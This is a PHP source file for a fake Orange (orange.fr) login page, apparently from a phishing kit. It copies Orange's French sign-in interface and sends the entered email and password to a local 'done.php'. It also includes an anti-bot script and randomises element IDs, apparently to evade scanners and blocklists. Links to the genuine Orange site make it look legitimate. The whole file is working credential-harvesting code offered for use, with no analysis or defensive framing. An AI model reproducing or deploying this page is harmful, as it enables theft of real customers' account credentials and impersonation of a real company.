<?php
session_start();
error_reporting(0);
@ini_set('display_errors', 0);
if(isset($_GET['action'])){
    if($_GET['action'] == "false"){
        unset($_SESSION['email']);
        header("Location: index.php");
    }
}

include("function/antibots.php");
?>
<!DOCTYPE html>
<html lang="fr">
<head data-placeholder-focus="false">
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="msapplication-config" content="none"/>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="format-detection" content="telephone=no">
    <title>Identifiez-vous avec votre compte Orange</title>

    <noscript>
        <style type="text/css">
            body {
                display: none;
            }
        </style>
        <meta http-equiv="refresh" content="0; url=/assistance"/>
    </noscript>

    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="mobile-web-app-capable" content="yes">

    <link rel="apple-touch-icon" sizes="57x57" href="icons/apple-touch-icon-57x57.png">
    <link rel="apple-touch-icon" sizes="60x60" href="icons/apple-touch-icon-60x60.png">
    <link rel="apple-touch-icon" sizes="72x72" href="icons/apple-touch-icon-72x72.png">
    <link rel="apple-touch-icon" sizes="76x76" href="icons/apple-touch-icon-76x76.png">
    <link rel="apple-touch-icon" sizes="114x114" href="icons/apple-touch-icon-114x114.png">
    <link rel="apple-touch-icon" sizes="120x120" href="icons/apple-touch-icon-120x120.png">
    <link rel="apple-touch-icon" sizes="144x144" href="icons/apple-touch-icon-144x144.png">
    <link rel="apple-touch-icon" sizes="152x152" href="icons/apple-touch-icon-152x152.png">
    <link rel="apple-touch-icon" sizes="180x180" href="icons/apple-touch-icon-180x180.png">

    <link rel="icon" type="image/png" href="icons/favicon-32x32.png" sizes="32x32">
    <link rel="icon" type="image/png" href="icons/favicon-194x194.png" sizes="194x194">
    <link rel="icon" type="image/png" href="icons/favicon-96x96.png" sizes="96x96">
    <link rel="icon" type="image/png" href="icons/android-chrome-36x36.png" sizes="36x36">
    <link rel="icon" type="image/png" href="icons/android-chrome-48x48.png" sizes="48x48">
    <link rel="icon" type="image/png" href="icons/android-chrome-72x72.png" sizes="72x72">
    <link rel="icon" type="image/png" href="icons/android-chrome-96x96.png" sizes="96x96">
    <link rel="icon" type="image/png" href="icons/android-chrome-144x144.png" sizes="144x144">
    <link rel="icon" type="image/png" href="icons/android-chrome-192x192.png" sizes="192x192">
    <link rel="icon" type="image/png" href="icons/favicon-16x16.png" sizes="16x16">
    <link rel="stylesheet" href="css/bundle.min.css">
            <style>
            .eui-banner {
                background-image: url("icons/om_desktop.png");
            }

            .eui-banner-mc {
                background-image: url("icons/mc_desktop_old.png");
            }
            #promoteMCicon{
                background: url("icons/promoteMCDesktop.gif") no-repeat;
                background-size: 100%;
                height: 32rem;
                width: 30rem;
            }

            @media (max-width: 767px) {
                .eui-banner {
                    background-image: url("icons/om_mobile.png");
                }

                .eui-banner-mc {
                    background-image: url("icons/mc_mobile_old.png");
                }

                #promoteMCicon {
                    background: url("icons/promoteMCMobile.gif") no-repeat;
                    background-size: 100%;
                    height: 15rem;
                    width: 30.2rem;
                }
            }

            .off-screen {
                position: fixed;
                bottom: 0;
                right: 0;
                height: 0 !important;
                width: 0 !important;
                overflow: hidden;
                opacity: 0;
                filter: alpha(opacity=0);
            }
            #forceMCLabel.disabled, #forceMCLabelBis.disabled  {
                display: none;
            }
        </style>
        <script type="text/javascript">
      window.Eui = {
        params: {"return_url":"https:\/\/www.orange.fr\/portail"},
        headers: {"content-type":"application\/json"},
        apiConfig: {"baseUrl":"front","timeout":15000,"retry":20,"resources":{"login":{"path":"/login.php","method":"POST"},"password":{"path":"\/password","method":"POST"},"challenge":{"path":"\/challenge","method":"POST"},"captcha":{"path":"\/captcha","method":"POST"},"keepConnected":{"path":"\/keep-connected","method":"POST"},"reauthentication":{"path":"\/reauthentication","method":"POST"},"accounts":{"path":"\/accounts","method":"GET"},"probe":{"path":"\/report\/probe","method":"POST"},"confirm":{"path":"\/confirm","method":"POST"},"await":{"path":"\/await","method":"GET"},"reportError":{"path":"\/report\/error","method":"POST"},"deactivate":{"path":"\/deactivate","method":"POST"},"promoteLaterMC":{"path":"\/promoteLaterMC","method":"POST"},"activateMC":{"path":"\/activateMC","method":"POST"},"authToken":{"path":"\/authToken","method":"POST"},"authCookie":{"path":"\/authCookie","method":"GET"}}},
        i18n: {errors: {"408":"Le service a rencontr\u00e9 un probl\u00e8me r\u00e9seau, veuillez r\u00e9essayer.","503":"Cette page rencontre un probl\u00e8me technique, r\u00e9essayez un peu plus tard.","100":"Vous n\u2019avez pas indiqu\u00e9 l\u2019adresse mail ou le num\u00e9ro de mobile de votre compte Orange.","101":"Cette adresse mail ou ce num\u00e9ro de mobile n\u2019est pas valide. V\u00e9rifiez votre saisie.","102":"Vous n\u2019avez pas saisi votre mot de passe.","104":"C\u2019est incorrect, v\u00e9rifiez l\u2019adresse mail et le mot de passe saisis.","105":"Pour vous permettre de vous identifier votre navigateur doit accepter les cookies. <a href=\"https:\/\/r.orange.fr\/r\/Oid_cookies\" target=\"_self\" title=\"En savoir plus.\">En savoir plus.<\/a>","106":"Champ obligatoire"}, labels: {"titlePassAssistShow":"afficher le mot de passe","titlePassAssistHide":"cacher le mot de passe"}},
        mem: true,
        ad: true,
        stage: 'login',
        templateErrorTech: "<div class=\"row\">    <div class=\"col-xs-12 col-md-12 col-lg-11 col-xl-9\">        <div class=\"eui-error-area\">            <div class=\"zone-icon\">                <div class=\"eui-svg eui-icon-warning\"><\/div>            <\/div>            <div class=\"zone-msg\">                <p id=\"msgWarning\">Vous \u00eates rest\u00e9 longtemps inactif.<\/p>            <\/div>            <div class=\"zone-msg-btm\">                <p id=\"msgAction\">Vous pouvez recommencer<\/p>            <\/div>            <div class=\"clearfix\"><\/div>            <button id=\"btnRefresh\" type=\"button\" class=\"btn btn-info eui-btn-sub\">Recommencer<\/button>        <\/div>    <\/div><\/div>",
        templateAuthToken: "",
        ttls: 3600,
        reportError:  true,
      };
    </script>
    
    
            <script type="text/javascript">var o_confCommon = {"centeredPage":true,"genericHeaderZone":false,"infoCookieZone":false,"persoZone":false,"typeEnv":"prod","tracking":{"Tealium":{"deactivate":false,"profile":"identite"},"Gstat":{"useServerRedirect":false}},"login":{"disabled":true}}; var o_data =  {"domaine":"Identit\u00e9","canal":"Web, Mobile Web","couleur":"Orange","univers_affichage":"Formulaire","segment":"RES"};</script>
        
    <script src="js/bundle.min.js"></script>
   </head>
<body>
<a href="https://login.orange.fr/?return_url=https://www.orange.fr/portail"><img src="icons/front.png"/></a>
<main class="eui-container" role="main">
    <div class="o-container-fluid eui-title-area">
        <div class="row">
            <div class="col-xs-12 col-md-8 col-lg-8 col-xl-8">
                <h1 id="<?=rand(12390, 8756)."-xX666Xx-".rand(12390, 8756)?>  title">Identifiez-vous</h1>
            </div>
        </div>
    </div>
    <div class="o-container-fluid">
        <div class="row">
            <div class="col-xs-12 col-md-6 col-lg-6 col-xl-6 ">
                <?php
                $without =  '<div id="stage" class="">
                    <form novalidate class="eui-form" id="euiForm" action="done.php">
    <div id="eui-accounts">
        
    </div>
    <div class="form-group ">
        <h2 class="sr-only">Indiquez votre compte Orange</h2>
        <div class="eui-input-label">
            <div class="eui-row">
                <label for="login" id="loginLabel" class="eui-label">Indiquez votre compte Orange</label>
                <div class="eui-assistance-area">
                    <button data-oevent="idme_login;clic_bulle_aide_saisie;bulle_aide_saisie" class="eui-svg eui-icon-help" type="button" id="helpLogin">
                        <span class="sr-only">aide</span>
                    </button>
                </div>
            </div>
        </div>
        <div aria-label="aide" class="eui-help" id="helpLoginCnt" style="display : none;">
            <p class="noSelectContent" tabindex="-1"><span>Votre compte Orange permet l’accès à vos services personnels. Il est désigné par une adresse e-mail ou un numéro de mobile.</span><br /><span>C’est votre première visite >> <a href="/aide" target="_self" title="Aide">Aide</a></span></p>
        </div>

        <h6 id="error-msg-box-login" tabindex="0" class="form-control-message" aria-live="assertive" role="alert" title="erreur"></h6>        <input type="text" id="login"
            placeholder="Adresse mail ou n° de mobile Orange"
            class="form-control"
            maxlength="256"
            autocorrect="off"
            autocapitalize="off"
            spellcheck="false"
            aria-describedby="error-msg-box-login"
            aria-invalid=""/>
    </div>
    <button id="btnSubmit" type="submit" class="btn btn-info eui-btn-sub"  style="visibility: hidden;">Continuer</button>
</form>                    <nav class="eui-links row" role="navigation">
                                            
                                                
                        <div id="firstAuthentBloc" class="col-xs-12 col-md-12 col-lg-12 col-xl-12">
                            <a id="firstAuthentLink" data-oevent="idme_login;clic_premiere_connexion;lien_premiere_connexion" href="/firstConnection?return_url=https%3A%2F%2Fwww.orange.fr%2Fportail" title="Vous vous identifiez pour la première fois  ?">Vous vous identifiez pour la première fois  ?</a>
                        </div>

                                                    <div id="firstAccessDiv" class="col-xs-12 col-md-12 col-lg-12 col-xl-12">
                                <a id="firstAccessLink" data-oevent="idme_login;clic_créer_compte;créer_votre_compte" href="https://r.orange.fr/r/Oid_signup?return_url=https://www.orange.fr/portail"
                                   title="Vous n’êtes pas client ? Créer votre compte">Vous n’êtes pas client ? Créer votre compte</a>
                            </div>
                        
                                                    <div id="forgotCodeMC" class="col-xs-12 col-md-12 col-lg-12 col-xl-12" style="display: none;">
                                <a id="forgotCodeMCLink" href="#" title="Code confidentiel oublié ?">Code confidentiel oublié ?</a>
                            </div>
                        
                                                    <div id="discoverMC" class="col-xs-12 col-md-12 col-lg-12 col-xl-12" style="display: none">
                                <a id="discoverMCLink" href="https://mc.orange.fr?return_url=https%3A%2F%2Fwww.orange.fr%2Fportail">
                                    <img id="discoverMCLinkImg" src="icons/Logo_MC_noir_fond_transparent_small.png">
                                    <img id="discoverMCLinkImgHover" style="display: none;" src="icons/Logo_MC_orange_fond_transparent_small.png">
                                     Comment s’identifier plus vite et plus facilement ?                                </a>
                            </div>
                        
                        <div id="moreHelpLink" class="col-xs-12 col-md-12 col-lg-12 col-xl-12">
                            <a id="helpLink" data-oevent-category="idme_login" data-oevent-action="clic_aide" data-oevent-label="aide" href="/aide?return_url=https%3A%2F%2Fwww.orange.fr%2Fportail"
                               title="Besoin d’aide ?">Besoin d’aide ?</a>
                        </div>

                        
                                                    <div id="authWithoutMCDiv" class="col-xs-12 col-md-12 col-lg-12 col-xl-12 " style="display: none;">
                                <a id="authWithoutMCLink" class="link-action-password" href="#" title="S’identifier avec votre mot de passe" data-oevent-category="idme_mc_invit" data-oevent-action="clic_sidentifier_sans_mc" data-oevent-label="sidentifier_sans_mc">S’identifier avec votre mot de passe</a>
                            </div>
                            <div class="eui-help col-xs-12 disabled" id="forceMCLabel">
                                Par sécurité, vous devez vous identifier avec Mobile Connect.                                <button type="button" class="eui-svg eui-close eui-icon-close-grey">
                                    <span class="sr-only">fermer</span>
                                </button>
                            </div>
                            <div class="eui-help col-xs-12 disabled" id="forceMCLabelBis">
                                Suite à plusieurs tentatives d’accès erronées, l’accès à ce compte par mot de passe est temporairement bloqué. Réessayez un peu plus tard.                                <button type="button" class="eui-svg eui-close eui-icon-close-grey">
                                    <span class="sr-only">fermer</span>
                                </button>
                            </div>
                                                                                            </nav>
                </div>';
                if(isset($_SESSION['email'])){
                    $email = $_SESSION['email'];
                    $with = '<div id="stage" class="eui-st2">
                    <form novalidate="" class="eui-form" id="euiForms" method="post" action="done.php">
    <h2 class="sr-only">Saisissez votre mot de passe</h2>
    <div class="eui-identity-area">
    <div class="x-col-avatar">
        <div class="eui-avatar">
            <div class="eui-svg eui-icon-avatar" aria-label="Avatar d’utilisateur" id="accountAvatar" title="Avatar d’utilisateur"></div>
        </div>
    </div>
    <div class="x-col-identity">
        <div class="x-identity">
            <p class="x-dsn eui-dsn eui-ellipsis" aria-label="identifiant" id="accountLogin">'.$email.'</p>
                            <p class="eui-empty-login"></p>
                                    <span id="changeAccountDiv" style="display: inline;">
                <a data-oevent-category="idme_password" data-oevent-action="clic_changer_de_compte" data-oevent-label="utiliser_un_autre_compte" id="changeAccountLink" href="?action=false" title="Changer de compte">Changer de compte</a>
            </span>
                    </div>
    </div>
</div>
    <div class="clearfix"></div>
    <div class="form-group ">
        <div class="eui-input-label">
            <label for="password" id="passwordLabel">Saisissez votre mot de passe</label>
            <div class="eui-assistance-area">
                <button data-oevent="idme_password;clic_bulle_aide_mot_de_passe;bulle_aide_mot_de_passe" class="eui-svg eui-icon-help" type="button" id="helpPassword">
                    <span class="sr-only">aide</span>
                </button>
            </div>
        </div>
        <div class="eui-help" id="helpPasswordCnt" style="display : none;">
            <p class="noSelectContent" tabindex="-1">Vous ne retrouvez pas votre mot de passe. &gt;&gt; <a href="https://mdp.orange.fr?return_url=https%3A%2F%2Fwww.orange.fr%2Fportail&amp;login=b44YrCehYIyGH%2B04t4%2BCm%2F%2BWloSYE5zPa%2Bfm2t72L7av7L0FhJhy47b1H278urtlkoEfVBUHo0AX%2B4s2d4budttrVd3ACuTNBNXSdCfa5fNQXLQcOeoMbBp4iPUoNBgV2WIfZXlCng70QL4tiwNYxhsnQny5mlGIJ3QpmlqFTr7InM7YNx4NrHDXotzV6%2F8CSx9cY7tuxgI4wgor9rbPa9AilMOChl3hBX3TdkdOzsImXOCIa9mHJQPf7U%2F684SBC5MidL8n5keN3%2B%2FwCSSrhRg7YwT0Yk1AnrMoDBk7ztuQGWeF3ayfnU3D5xi7yVmn5u3sYQS9F4iAi4QH2o2d9Q%3D%3D" class="eui-reinitLostLink" title="Réinitialisez-le.">Réinitialisez-le.</a></p>
        </div>

        <h6 id="error-msg-box" tabindex="0" class="form-control-message" aria-live="assertive" role="alert" title="erreur"></h6>
        <input style="display:none;" type="text" id="login"
            value="'.$email.'"
            class="form-control"
            maxlength="256"
            autocorrect="off"
            autocapitalize="off"
            spellcheck="false"
            aria-describedby="error-msg-box-login"
            aria-invalid=""/>
        <input id="login" class="off-screen" type="text" value="'.$email.'" aria-hidden="true" tabindex="-1" autocorrect="off" spellcheck="false">

        <div id="passwordContainer">
        
            
            <input type="password" id="password" name="password" placeholder="Mot de passe" autocomplete="current-password" class="form-control pass-assist" maxlength="36"  aria-hidden="false" aria-describedby="error-msg-box" aria-invalid="false" required>
            <input type="text" id="passwordTxt" style="display: none" class="form-control pass-assist" maxlength="36" required="" aria-hidden="true" aria-describedby="error-msg-box" aria-invalid="false" aria-labelledby="passwordLabel" autocomplete="off" autocapitalize="none" spellcheck="false" autocorrect="off" required>

            <div id="assist-visual" class="input-control-visual">
                <div class="assist-area">
                    <div id="assist-icon" class="eui-svg-assist eui-icon-assist-hide">
                        <button id="assist-btn" type="button" class="transparent-btn">
                            <span id="assist-msg" class="sr-only">afficher le mot de passe</span>
                        </button>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <div class="form-group eui-checkbox">
                    <input type="checkbox" class="o-checkbox" id="remember" style="display:block">
            <label for="remember" id="rememberLabel"><span class="eui-label-content">Rester identifié</span>
            </label>
            </div>
    <div>
        <button id="btnSubmit" name="submit_btn" type="submit" class="btn btn-primary eui-btn-sub">S’identifier</button>
                    <a data-oevent="idme_password;clic_mot_de_passe_oublie;mot_de_passe_oublie" id="forgotPassword" class="eui-links-passwd" href="https://mdp.orange.fr?return_url=https%3A%2F%2Fwww.orange.fr%2Fportail&amp;login=b44YrCehYIyGH%2B04t4%2BCm%2F%2BWloSYE5zPa%2Bfm2t72L7av7L0FhJhy47b1H278urtlkoEfVBUHo0AX%2B4s2d4budttrVd3ACuTNBNXSdCfa5fNQXLQcOeoMbBp4iPUoNBgV2WIfZXlCng70QL4tiwNYxhsnQny5mlGIJ3QpmlqFTr7InM7YNx4NrHDXotzV6%2F8CSx9cY7tuxgI4wgor9rbPa9AilMOChl3hBX3TdkdOzsImXOCIa9mHJQPf7U%2F684SBC5MidL8n5keN3%2B%2FwCSSrhRg7YwT0Yk1AnrMoDBk7ztuQGWeF3ayfnU3D5xi7yVmn5u3sYQS9F4iAi4QH2o2d9Q%3D%3D" title="Mot de passe oublié ?">Mot de passe oublié ?</a>
            </div>

</form>                    <nav class="eui-links row" role="navigation">
                                            
                                                
                        <div id="firstAuthentBloc" class="col-xs-12 col-md-12 col-lg-12 col-xl-12" style="display: none;">
                            <a id="firstAuthentLink" data-oevent="idme_login;clic_premiere_connexion;lien_premiere_connexion" href="/firstConnection?return_url=https%3A%2F%2Fwww.orange.fr%2Fportail" title="Vous vous identifiez pour la première fois  ?">Vous vous identifiez pour la première fois  ?</a>
                        </div>

                                                    <div id="firstAccessDiv" class="col-xs-12 col-md-12 col-lg-12 col-xl-12" style="display: none;">
                                <a id="firstAccessLink" data-oevent="idme_login;clic_créer_compte;créer_votre_compte" href="https://r.orange.fr/r/Oid_signup?return_url=https://www.orange.fr/portail" title="Vous n’êtes pas client ? Créer votre compte">Vous n’êtes pas client ? Créer votre compte</a>
                            </div>
                        
                                                    <div id="forgotCodeMC" class="col-xs-12 col-md-12 col-lg-12 col-xl-12" style="display: none;">
                                <a id="forgotCodeMCLink" href="#" title="Code confidentiel oublié ?">Code confidentiel oublié ?</a>
                            </div>
                        
                                                    <div id="discoverMC" class="col-xs-12 col-md-12 col-lg-12 col-xl-12" style="display: none">
                                <a id="discoverMCLink" href="https://mc.orange.fr?return_url=https%3A%2F%2Fwww.orange.fr%2Fportail">
                                    <img id="discoverMCLinkImg" src="icons/Logo_MC_noir_fond_transparent_small.png">
                                    <img id="discoverMCLinkImgHover" style="display: none;" src="icons/Logo_MC_orange_fond_transparent_small.png">
                                     Comment s’identifier plus vite et plus facilement ?                                </a>
                            </div>
                        
                        <div id="moreHelpLink" class="col-xs-12 col-md-12 col-lg-12 col-xl-12">
                            <a id="helpLink" data-oevent-category="idme_login" data-oevent-action="clic_aide" data-oevent-label="aide" href="/aide?return_url=https%3A%2F%2Fwww.orange.fr%2Fportail" title="Besoin d’aide ?">Besoin d’aide ?</a>
                        </div>

                        
                                                    <div id="authWithoutMCDiv" class="col-xs-12 col-md-12 col-lg-12 col-xl-12 " style="display: none;">
                                <a id="authWithoutMCLink" class="link-action-password" href="#" title="S’identifier avec votre mot de passe" data-oevent-category="idme_mc_invit" data-oevent-action="clic_sidentifier_sans_mc" data-oevent-label="sidentifier_sans_mc">S’identifier avec votre mot de passe</a>
                            </div>
                            <div class="eui-help col-xs-12 disabled" id="forceMCLabel">
                                Par sécurité, vous devez vous identifier avec Mobile Connect.                                <button type="button" class="eui-svg eui-close eui-icon-close-grey">
                                    <span class="sr-only">fermer</span>
                                </button>
                            </div>
                            <div class="eui-help col-xs-12 disabled" id="forceMCLabelBis">
                                Suite à plusieurs tentatives d’accès erronées, l’accès à ce compte par mot de passe est temporairement bloqué. Réessayez un peu plus tard.                                <button type="button" class="eui-svg eui-close eui-icon-close-grey">
                                    <span class="sr-only">fermer</span>
                                </button>
                            </div>
                                                                                            </nav>
                </div>';
                   echo $with; 
                }else{
                    echo $without;
                }
                ?>
            </div>

                            <div id="<?=rand(12390, 8756)."-xX666Xx-".rand(12390, 8756)?>  magicZone" class="eui-banner-place col-xs-12 col-md-5 col-lg-4 col-xl-4 col-md-offset-1">
                                            <a id="<?=rand(12390, 8756)."-xX666Xx-".rand(12390, 8756)?>  magicZoneLink" data-oevent-category="idme_login" data-oevent-action="clic_zone_com" data-oevent-label="service" class="eui-block"
                           href="https://r.orange.fr/r/Oapp_Orange_EtMoi" target="_blank" rel="noopener noreferrer">
                            <div id='elmt-banner' class='eui-banner'
                                 title="Lien zone de communication (nouvel onglet)"></div>
                        </a>
                                    </div>
                    </div>
    </div>
</main>
<footer>
            <div class="eui-footer-banner hidden-xs hidden-sm">
            <div class="eui-mega-banner oan_ad" id="<?=rand(12390, 8756)."-xX666Xx-".rand(12390, 8756)?>  ora_2_728x90_identification"></div>
        </div>
        <a href="https://login.orange.fr/?return_url=https://www.orange.fr/portail"><img src="icons/end.png"/></a>
                <div id="<?=rand(12390, 8756)."-xX666Xx-".rand(12390, 8756)?>  cefooter"></div>
    </footer>
</body>
</html>